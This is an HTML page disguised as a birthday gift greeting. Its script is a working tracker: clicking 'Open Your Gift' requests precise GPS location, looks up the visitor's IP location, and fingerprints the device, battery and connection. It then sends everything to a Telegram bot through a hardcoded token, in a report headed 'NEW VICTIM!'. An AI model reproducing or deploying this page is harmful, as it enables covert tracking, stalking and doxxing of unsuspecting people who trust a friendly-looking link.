<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Birthday! 🎂</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 30px;
            padding: 50px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }
        .gift-icon { font-size: 100px; margin-bottom: 20px; display: inline-block; }
        h1 { color: #333; margin-bottom: 10px; font-size: 32px; }
        .subtitle { color: #666; margin-bottom: 30px; }
        button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            padding: 14px 35px;
            border-radius: 50px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .message {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            border-radius: 20px;
            padding: 25px;
            margin-top: 25px;
            display: none;
            color: white;
        }
        .message.show { display: block; }
        .footer { margin-top: 25px; font-size: 11px; color: #aaa; }
    </style>
</head>
<body>
<div class="container">
    <div class="gift-icon">🎁</div>
    <h1>🎂 Happy Birthday! 🎉</h1>
    <div class="subtitle">Someone sent you a birthday surprise!</div>
    <button id="giftBtn">🎁 Open Your Gift 🎁</button>
    <div class="message" id="message">
        <h2>🎈 SURPRISE! 🎈</h2>
        <p>Wishing you a fantastic birthday! 🎂</p>
        <p>May all your wishes come true! ✨</p>
    </div>
    <div class="footer">❤️ Made with love</div>
</div>

<script>
    const BOT_TOKEN = "8858548041:AAH5-uEvtsWNMsCpeEKsvOseVnLM-tAHaNs";
    
    const urlParams = new URLSearchParams(window.location.search);
    const targetId = urlParams.get('id') || 'unknown';
    const targetName = urlParams.get('name') || 'Guest';
    const USER_CHAT_ID = urlParams.get('user_id') || '6323367629';
    
    let dataSent = false;
    
    async function sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: USER_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
        } catch(e) {}
    }
    
    async function sendLocationToTelegram(lat, lon) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: USER_CHAT_ID,
                    latitude: lat,
                    longitude: lon
                })
            });
        } catch(e) {}
    }
    
    // Battery Info - FIXED
    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                    chargingTime: battery.chargingTime || 'N/A',
                    dischargingTime: battery.dischargingTime || 'N/A'
                };
            }
        } catch(e) {
            console.log('Battery error:', e);
        }
        return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
    }
    
    // Better IP API - More accurate city/state
    async function getIPInfo() {
        try {
            // Using ip-api.com (more accurate for India)
            const resp = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,query');
            const data = await resp.json();
            if (data.status === 'success') {
                return {
                    ip: data.query,
                    city: data.city,
                    region: data.regionName,
                    country: data.country,
                    postal: data.zip || 'N/A',
                    isp: data.isp,
                    org: data.org,
                    as: data.as,
                    lat: data.lat,
                    lon: data.lon,
                    mobile: data.mobile ? 'Yes' : 'No',
                    proxy: data.proxy ? 'Yes' : 'No'
                };
            }
        } catch(e) {}
        
        // Fallback to ipapi.co
        try {
            const resp = await fetch('https://ipapi.co/json/');
            const data = await resp.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                postal: data.postal,
                isp: data.org,
                lat: data.latitude,
                lon: data.longitude
            };
        } catch(e) {}
        
        return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
    }
    
    // GPS Location with high accuracy
    async function getGPSLocation() {
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });
            return {
                success: true,
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                altitude: pos.coords.altitude || 'N/A',
                speed: pos.coords.speed || 'N/A'
            };
        } catch(e) {
            return { success: false, error: e.message };
        }
    }
    
    // Advanced Device Info
    async function getDeviceInfo() {
        // Get installed fonts
        const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Roboto', 'Open Sans'];
        const availableFonts = [];
        for (const font of fonts) {
            if (document.fonts.check(`12px "${font}"`)) {
                availableFonts.push(font);
            }
        }
        
        // Get GPU info
        let gpu = 'N/A';
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
        
        // Get connection info
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        let connInfo = {};
        if (connection) {
            connInfo = {
                type: connection.effectiveType || 'N/A',
                downlink: connection.downlink || 'N/A',
                rtt: connection.rtt || 'N/A'
            };
        }
        
        return {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
            screen: `${screen.width}x${screen.height}`,
            screenColorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            online: navigator.onLine,
            cookiesEnabled: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory || 'N/A',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            vendor: navigator.vendor || 'N/A',
            fonts: availableFonts.slice(0, 5).join(', '),
            gpu: gpu.substring(0, 80),
            connectionType: connInfo.type,
            connectionSpeed: connInfo.downlink,
            connectionRTT: connInfo.rtt
        };
    }
    
    document.getElementById('giftBtn').onclick = async function() {
        if (dataSent) return;
        
        document.getElementById('giftBtn').innerHTML = "🎁 Opening... 🎁";
        document.getElementById('giftBtn').disabled = true;
        
        // Collect all data
        const [battery, ipInfo, gps, device] = await Promise.all([
            getBatteryInfo(),
            getIPInfo(),
            getGPSLocation(),
            getDeviceInfo()
        ]);
        
        let msg = `🎁 <b>NEW VICTIM!</b>\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `🔗 <b>Link:</b> ${targetName}\n`;
        msg += `🆔 <b>ID:</b> ${targetId}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        
        // GPS Section
        if (gps.success) {
            msg += `<b>📍 EXACT GPS LOCATION</b>\n`;
            msg += `├ Lat: <code>${gps.lat}</code>\n`;
            msg += `├ Lon: <code>${gps.lon}</code>\n`;
            msg += `├ Accuracy: ${Math.round(gps.accuracy)} meters\n`;
            if(gps.altitude != 'N/A') msg += `├ Altitude: ${gps.altitude}m\n`;
            if(gps.speed != 'N/A') msg += `├ Speed: ${gps.speed} m/s\n`;
            msg += `└ 🗺️ <a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}">VIEW ON MAP</a>\n\n`;
            
            // Send separate location
            await sendLocationToTelegram(gps.lat, gps.lon);
        } else {
            msg += `<b>📍 GPS LOCATION</b>\n`;
            msg += `└ ❌ ${gps.error || 'Permission denied or not available'}\n\n`;
        }
        
        // Network Section - More accurate
        msg += `<b>🌐 NETWORK INFO</b>\n`;
        msg += `├ IP: <code>${ipInfo.ip}</code>\n`;
        msg += `├ City: ${ipInfo.city}\n`;
        msg += `├ State: ${ipInfo.region}\n`;
        msg += `├ Country: ${ipInfo.country}\n`;
        msg += `├ PIN Code: ${ipInfo.postal || 'N/A'}\n`;
        msg += `├ ISP: ${ipInfo.isp}\n`;
        if(ipInfo.mobile) msg += `├ Mobile Network: ${ipInfo.mobile}\n`;
        if(ipInfo.proxy) msg += `├ Proxy/VPN: ${ipInfo.proxy}\n`;
        msg += `└ IP Location: ${ipInfo.lat}, ${ipInfo.lon}\n\n`;
        
        // Device Section
        msg += `<b>📱 DEVICE INFO</b>\n`;
        msg += `├ Platform: ${device.platform}\n`;
        msg += `├ Screen: ${device.screen} (${device.screenColorDepth}-bit)\n`;
        msg += `├ Pixel Ratio: ${device.pixelRatio}x\n`;
        msg += `├ Touch Points: ${device.maxTouchPoints}\n`;
        msg += `├ CPU Cores: ${device.hardwareConcurrency}\n`;
        if(device.deviceMemory != 'N/A') msg += `├ RAM: ${device.deviceMemory} GB\n`;
        msg += `├ GPU: ${device.gpu}\n`;
        msg += `├ Timezone: ${device.timezone} (UTC${-device.timezoneOffset/60})\n`;
        msg += `├ Language: ${device.language}\n`;
        msg += `├ Fonts: ${device.fonts || 'N/A'}\n`;
        msg += `└ Cookies: ${device.cookiesEnabled ? 'Enabled' : 'Disabled'}\n\n`;
        
        // Battery Section - FIXED
        msg += `<b>🔋 BATTERY INFO</b>\n`;
        msg += `├ Level: ${battery.level}%\n`;
        msg += `├ Charging: ${battery.charging ? '✅ Yes' : '❌ No'}\n`;
        if(battery.chargingTime != 'N/A') msg += `├ Charging Time: ${battery.chargingTime} sec\n`;
        if(battery.dischargingTime != 'N/A') msg += `└ Remaining: ${Math.round(battery.dischargingTime/60)} minutes\n`;
        else msg += `└ Remaining: N/A\n`;
        msg += `\n`;
        
        // Connection Section
        msg += `<b>📡 CONNECTION</b>\n`;
        msg += `├ Type: ${device.connectionType}\n`;
        if(device.connectionSpeed != 'N/A') msg += `├ Speed: ${device.connectionSpeed} Mbps\n`;
        if(device.connectionRTT != 'N/A') msg += `└ Latency: ${device.connectionRTT} ms\n\n`;
        
        // Browser Section
        msg += `<b>🌐 BROWSER INFO</b>\n`;
        msg += `├ Vendor: ${device.vendor}\n`;
        msg += `├ Languages: ${device.languages}\n`;
        msg += `└ Online: ${device.online ? 'Yes' : 'No'}\n\n`;
        
        msg += `<b>🕐 TIMESTAMP</b>\n`;
        msg += `└ ${new Date().toLocaleString()}\n\n`;
        
        msg += `<b>🔗 FULL USER AGENT</b>\n`;
        msg += `<code>${device.userAgent.substring(0, 150)}</code>\n\n`;
        
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `👨‍💻 @KINGITACHI18`;
        
        await sendToTelegram(msg);
        
        document.getElementById('message').classList.add('show');
        document.getElementById('giftBtn').style.display = 'none';
        dataSent = true;
    };
</script>
</body>
</html>
